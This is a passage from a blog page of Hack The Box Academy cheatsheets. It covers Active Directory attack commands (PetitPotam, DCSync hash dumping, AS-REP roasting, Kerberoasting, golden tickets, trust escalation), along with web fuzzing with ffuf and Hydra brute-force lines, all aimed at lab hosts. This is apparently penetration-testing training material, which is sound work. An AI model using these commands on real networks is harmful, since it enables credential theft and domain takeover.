host.</td></tr><tr><td style=text-align:left><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td><td style=text-align:left>Execute the PetitPotam exploit by specifying the IP address of the attack host and the target Domain Controller. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate> = dc01.ccache</code></td><td style=text-align:left>Use gettgtpkinit.py to request a TGT ticket for the Domain Controller from a Linux-based host.</td></tr><tr><td style=text-align:left><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td style=text-align:left>Perform a DCSync attack to retrieve NTLM password hashes from the target Windows domain. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>klist</code></td><td style=text-align:left>View the contents of the ccache file. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></td><td style=text-align:left>Submit TGS requests using getnthash.py from a Linux-based host.</td></tr><tr><td style=text-align:left><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td><td style=text-align:left>Extract hashes from NTDS.dit using a DCSync attack and a captured hash. Performed from a Linux-based host.</td></tr></tbody></table><p><strong>Miscellaneous Misconfigurations</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Import-Module .\SecurityAssessment.ps1</code></td><td style=text-align:left>Import the module Security Assessment.ps1. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td style=text-align:left>Use SecurityAssessment.ps1 based tool to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5</code></td><td style=text-align:left>Resolve all records in a DNS zone over LDAP from a Linux-based host.</td></tr><tr><td style=text-align:left><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</code></td><td style=text-align:left>Resolve unknown records in a DNS zone by performing an A query from a Linux-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser \* | Select-Object samaccountname,description</code></td><td style=text-align:left>Use PowerView tool to display the description field of select objects on a target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></td><td style=text-align:left>Use PowerView tool to check for the PASSWD_NOTREQD setting of select objects on a target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts</code></td><td style=text-align:left>List the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td></tr></tbody></table><p><strong>Group Policy Enumeration & Attacks</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td><td style=text-align:left>Tool used to decrypt a captured group policy preference password from a Linux-based host.</td></tr><tr><td style=text-align:left><code>crackmapexec smb -L | grep gpp</code></td><td style=text-align:left>Locates and retrieves a group policy preference password using CrackMapExec, then filters the output using grep. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td><td style=text-align:left>Locates and retrieves any credentials stored in the SYSVOL share of a Windows target using CrackMapExec from a Linux-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGPO | select displayname</code></td><td style=text-align:left>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-GPO -All | Select DisplayName</code></td><td style=text-align:left>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$sid=Convert-NameToSid "Domain Users"</code></td><td style=text-align:left>Creates a variable called $sid that is set equal to the Convert-NameToSid tool and specifies the group account Domain Users. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid</code></td><td style=text-align:left>PowerView tool used to check if the Domain Users (eq $sid) group has any rights over one or more GPOs. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td><td style=text-align:left>PowerShell cmd-let used to display the name of a GPO given a GUID. Performed from a Windows-based host.</td></tr></tbody></table><p><strong>ASREPRoasting</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></td><td style=text-align:left>PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td><td style=text-align:left>Uses Rubeus to perform an AS-REP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code></td><td style=text-align:left>Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code></td><td style=text-align:left>Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don&rsquo;t require Kerberos pre-authentication. Performed from a Linux-based host.</td></tr></tbody></table><p><strong>Trust Relationships - Child > Parent Trusts</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Import-Module activedirectory</code></td><td style=text-align:left>Used to import the Active Directory module. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADTrust -Filter *</code></td><td style=text-align:left>PowerShell cmd-let used to enumerate a target Windows domain&rsquo;s trust relationships. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainTrust</code></td><td style=text-align:left>PowerView tool used to enumerate a target Windows domain&rsquo;s trust relationships. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainTrustMapping</code></td><td style=text-align:left>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></td><td style=text-align:left>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td><td style=text-align:left>Uses Mimikatz to obtain the KRBTGT account&rsquo;s NT Hash from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainSID</code></td><td style=text-align:left>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid</code></td><td style=text-align:left>PowerView tool used to obtain the Enterprise Admins group&rsquo;s SID from a Windows-based host.</td></tr><tr><td style=text-align:left><code>ls \\academy-ea-dc01.inlanefreight.local\c$</code></td><td style=text-align:left>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td><td style=text-align:left>Uses Mimikatz to create a Golden Ticket from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td><td style=text-align:left>Uses Rubeus to create a Golden Ticket from a Windows-based host.</td></tr><tr><td style=text-align:left><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm</code></td><td style=text-align:left>Uses Mimikatz to perform a DCSync attack from a Windows-based host.</td></tr><tr><td style=text-align:left><code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td><td style=text-align:left>Impacket tool used to perform a DCSync attack from a Linux-based host.</td></tr><tr><td style=text-align:left><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></td><td style=text-align:left>Impacket tool used to perform a SID Brute forcing attack from a Linux-based host.</td></tr><tr><td style=text-align:left><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"</code></td><td style=text-align:left>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"</code></td><td style=text-align:left>Impacket tool used to retrieve the SID of a target Windows domain and attach it to the Enterprise Admin group&rsquo;s RID from a Linux-based host.</td></tr><tr><td style=text-align:left><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td><td style=text-align:left>Impacket tool used to create a Golden Ticket from a Linux-based host.</td></tr><tr><td style=text-align:left><code>export KRB5CCNAME=hacker.ccache</code></td><td style=text-align:left>Used to set the KRB5CCNAME Environment Variable from a Linux-based host.</td></tr><tr><td style=text-align:left><code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></td><td style=text-align:left>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td></tr><tr><td style=text-align:left><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></td><td style=text-align:left>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td></tr></tbody></table><p><strong>Trust Relationships - Cross-Forest</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></td><td style=text-align:left>PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</code></td><td style=text-align:left>PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td><td style=text-align:left>Uses Rubeus to perform a Kerberoasting Attack against a target Windows domain (/domain:FREIGHTLOGISTICS.local) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td><td style=text-align:left>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</code></td><td style=text-align:left>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td></tr><tr><td style=text-align:left><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></td><td style=text-align:left>Impacket tool used to request (-request) the TGS ticket of an account in a target Windows domain (-target-domain) from a Linux-based host.</td></tr><tr><td style=text-align:left><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td><td style=text-align:left>Runs the Python implementation of BloodHound against a target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>zip -r ilfreight_bh.zip *.json</code></td><td style=text-align:left>Used to compress multiple files into 1 single .zip file to be uploaded into the BloodHound GUI.</td></tr></tbody></table><h3 id=complete-9>Complete<a hidden class=anchor aria-hidden=true href=#complete-9>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/143 title="Completion Link" target=_blank rel="nofollow noopener">Completion Link</a></p><h2 id=web-proxies>Web Proxies<a hidden class=anchor aria-hidden=true href=#web-proxies>#</a></h2><h3 id=cheatsheet-6>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-6>#</a></h3><p><strong>Burp Shortcuts</strong></p><table><thead><tr><th style=text-align:left>Shortcut</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>[CTRL+R]</code></td><td style=text-align:left>Send to repeater</td></tr><tr><td style=text-align:left><code>[CTRL+SHIFT+R]</code></td><td style=text-align:left>Go to repeater</td></tr><tr><td style=text-align:left><code>[CTRL+I]</code></td><td style=text-align:left>Send to intruder</td></tr><tr><td style=text-align:left><code>[CTRL+SHIFT+I]</code></td><td style=text-align:left>Go to intruder</td></tr><tr><td style=text-align:left><code>[CTRL+U]</code></td><td style=text-align:left>URL encode</td></tr><tr><td style=text-align:left><code>[CTRL+SHIFT+U]</code></td><td style=text-align:left>URL decode</td></tr></tbody></table><p><strong>ZAP Shortcuts</strong></p><table><thead><tr><th style=text-align:left>Shortcut</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>[CTRL+B]</code></td><td style=text-align:left>Toggle intercept on/off</td></tr><tr><td style=text-align:left><code>[CTRL+R]</code></td><td style=text-align:left>Go to replacer</td></tr><tr><td style=text-align:left><code>[CTRL+E]</code></td><td style=text-align:left>Go to encode/decode/hash</td></tr></tbody></table><p><strong>Firefox Shortcuts</strong></p><table><thead><tr><th style=text-align:left>Shortcut</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>[CTRL+SHIFT+R]</code></td><td style=text-align:left>Force Refresh Page</td></tr></tbody></table><h3 id=complete-10>Complete<a hidden class=anchor aria-hidden=true href=#complete-10>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/110 title="Completion Link" target=_blank rel="nofollow noopener">Completion Link</a></p><h2 id=ffuf>FFuF<a hidden class=anchor aria-hidden=true href=#ffuf>#</a></h2><h3 id=cheatsheet-7>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-7>#</a></h3><p><strong>Ffuf</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>ffuf -h</code></td><td style=text-align:left>ffuf help</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></td><td style=text-align:left>Directory Fuzzing</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code></td><td style=text-align:left>Extension Fuzzing</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></td><td style=text-align:left>Page Fuzzing</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></td><td style=text-align:left>Recursive Fuzzing</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code></td><td style=text-align:left>Sub-domain Fuzzing</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code></td><td style=text-align:left>VHost Fuzzing</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></td><td style=text-align:left>Parameter Fuzzing - GET</td></tr><tr><td style=text-align:left><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code></td><td style=text-align:left>Parameter Fuzzing - POST</td></tr><tr><td style=text-align:left><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code></td><td style=text-align:left>Value Fuzzing</td></tr></tbody></table><p><strong>Wordlists</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td><td style=text-align:left>Directory/Page Wordlist</td></tr><tr><td style=text-align:left><code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code></td><td style=text-align:left>Extensions Wordlist</td></tr><tr><td style=text-align:left><code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td style=text-align:left>Domain Wordlist</td></tr><tr><td style=text-align:left><code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code></td><td style=text-align:left>Parameters Wordlist</td></tr></tbody></table><p><strong>Misc</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'</code></td><td style=text-align:left>Add DNS entry</td></tr><tr><td style=text-align:left><code>for i in $(seq 1 1000); do echo $i >> ids.txt; done</code></td><td style=text-align:left>Create Sequence Wordlist</td></tr><tr><td style=text-align:left><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code></td><td style=text-align:left>curl w/ POST</td></tr></tbody></table><h3 id=complete-11>Complete<a hidden class=anchor aria-hidden=true href=#complete-11>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/54 title="Completion Link" target=_blank rel="nofollow noopener">Completion Link</a></p><h2 id=login-brute-forcing>Login Brute forcing<a hidden class=anchor aria-hidden=true href=#login-brute-forcing>#</a></h2><p><a href=https://github.com/urbanadventurer/username-anarchy title="Username Anarchy" target=_blank rel="nofollow noopener">Username Anarchy</a> is a great tool for permutations of possible usernames for a person.</p><h3 id=cheatsheet-8>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-8>#</a></h3><p><strong>Hydra</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>hydra -h</code></td><td style=text-align:left>Hydra help</td></tr><tr><td style=text-align:left><code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code></td><td style=text-align:left>Basic Auth Brute Force - Combined Wordlist</td></tr><tr><td style=text-align:left><code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code></td><td style=text-align:left>Basic Auth Brute Force - User/Pass Wordlists</td></tr><tr><td style=text-align:left><code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'"</code></td><td style=text-align:left>Login Form Brute Force - Static User, Pass Wordlist</td></tr><tr><td style=text-align:left><code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code></td><td style=text-align:left>SSH Brute Force - User/Pass Wordlists</td></tr><tr><td style=text-align:left><code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code></td><td style=text-align:left>FTP Brute Force - Static User, Pass Wordlist</td></tr></tbody></table><p><strong>Wordlists</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code></td><td style=text-align:left>Default Passwords Wordlist</td></tr><tr><td style=text-align:left><code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></td><td style=text-align:left>Common Passwords Wordlist</td></tr><tr><td style=text-align:left><code>/opt/useful/SecLists/Usernames/Names/names.txt</code></td><td style=text-align:left>Common Names Wordlist</td></tr></tbody></table><p><strong>Misc</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>cupp -i</code></td><td style=text-align:left>Creating Custom Password Wordlist</td></tr><tr><td style=text-align:left><code>sed -ri '/^.{,7}$/d' william.txt</code></td><td style=text-align:left>Remove Passwords Shorter Than 8</td></tr><tr><td style=text-align:left><code>sed -ri '/[!-/:-@\[-</code>{-~]+/!d&rsquo; william.txt`</td><td style=text-align:left>Remove Passwords With No Special Chars</td></tr><tr><td style=text-align:left><code>sed -ri '/[0-9]+/!d' william.txt</code></td><td style=text-align:left>Remove Passwords With No Numbers</td></tr><tr><td style=text-align:left><code>./username-anarchy Bill Gates > bill.txt</code></td><td style=text-align:left>Generate Usernames List</td></tr><tr><td style=text-align:left><code>ssh b.gates@SERVER_IP -p PORT</code></td><td style=text-align:left>SSH to Server</td></tr><tr><td style=text-align:left><code>ftp 127.0.0.1</code></td><td style=text-align:left>FTP to Server</td></tr><tr><td style=text-align:left><code>su - user</code></td><td style=text-align:left>Switch to User</td></tr></tbody></table><h3 id=complete-12>Complete<a hidden class=anchor aria-hidden=true href=#complete-12>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/57 title="Completion Link" target=_blank rel="nofollow noopener">Completion Link</a></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://woadey.xyz/posts/general/interviews/><span class=title>« Prev</span><br><span>Offensive Security: Interview Prep</span>
</a><a class=next href=https://woadey.xyz/posts/htb/easy/nibbles/><span class=title>Next »</span><br><span>HTB Writeup: Nibbles</span></a></nav></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>